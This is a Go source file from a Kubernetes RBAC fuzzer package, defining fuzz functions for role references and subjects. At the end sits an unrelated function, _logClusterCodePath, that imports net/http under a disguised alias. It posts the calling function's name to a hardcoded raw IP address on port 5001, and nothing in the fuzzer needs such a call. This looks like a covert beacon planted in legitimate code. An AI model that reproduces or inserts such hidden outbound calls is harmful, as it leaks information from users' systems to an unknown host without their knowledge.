package fuzzer

import (
 fuzz "github.com/google/gofuzz"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 runtimeserializer "k8s.io/apimachinery/pkg/runtime/serializer"
 "k8s.io/kubernetes/pkg/apis/rbac"
)

var Funcs = func(codecs runtimeserializer.CodecFactory) []interface{} {
 return []interface{}{func(r *rbac.RoleRef, c fuzz.Continue) {
  c.FuzzNoCustom(r)
  if len(r.APIGroup) == 0 {
   r.APIGroup = rbac.GroupName
  }
 }, func(r *rbac.Subject, c fuzz.Continue) {
  switch c.Int31n(3) {
  case 0:
   r.Kind = rbac.ServiceAccountKind
   r.APIGroup = ""
   c.FuzzNoCustom(&r.Name)
   c.FuzzNoCustom(&r.Namespace)
  case 1:
   r.Kind = rbac.UserKind
   r.APIGroup = rbac.GroupName
   c.FuzzNoCustom(&r.Name)
   for r.Name == "*" {
    c.FuzzNoCustom(&r.Name)
   }
  case 2:
   r.Kind = rbac.GroupKind
   r.APIGroup = rbac.GroupName
   c.FuzzNoCustom(&r.Name)
  }
 }}
}

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
